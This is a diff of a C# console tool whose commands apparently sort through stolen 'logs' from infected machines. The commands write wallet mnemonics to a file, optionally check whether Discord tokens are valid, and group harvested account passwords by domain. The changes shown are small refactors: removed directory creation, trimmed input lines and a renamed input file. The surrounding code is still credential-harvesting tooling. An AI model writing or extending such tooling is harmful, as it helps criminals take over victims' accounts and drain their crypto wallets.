@@ -30,8 +30,6 @@ public class MainView : ArgsView
     [Command]
     public async Task Wallets()
     {
-        Directory.CreateDirectory("Wallets");
-
         await using var mnemonics = new StreamWriter("Wallets/mnemonics.txt", new FileStreamOptions
         {
             Access = FileAccess.ReadWrite,
@@ -66,8 +64,6 @@ public class MainView : ArgsView
     [Command]
     public Task Discord()
     {
-        Directory.CreateDirectory("Discord");
-        
         StreamWriter? all, invalid = null, valid = null;
         
         System.Console.WriteLine("Check tokens? [Y/N]"); // todo add check proxies
@@ -108,10 +104,8 @@ public class MainView : ArgsView
     [Command]
     public Task Links()
     {
-        Directory.CreateDirectory("Links");
-
         using var writer = new StreamWriter("Links/links.txt", true);
-        var links = File.ReadAllLines("links.txt");
+        var links = File.ReadAllLines("links.txt").Select(x => x.Trim());
         
         foreach (var account in links.LinksFromLogs(_settings.Path))
         {
@@ -154,8 +148,7 @@ public class MainView : ArgsView
     [Command]
     public Task Accounts()
     {
-        Directory.CreateDirectory("Passwords");
-        var domains = File.ReadAllLines("games.txt").Select(x => x.Trim());
+        var domains = File.ReadAllLines("accounts.txt").Select(x => x.Trim());
 
         foreach (var (domain, accounts) in domains.AccountsFromLogs(_settings.Path)
                      .ToDictionary(
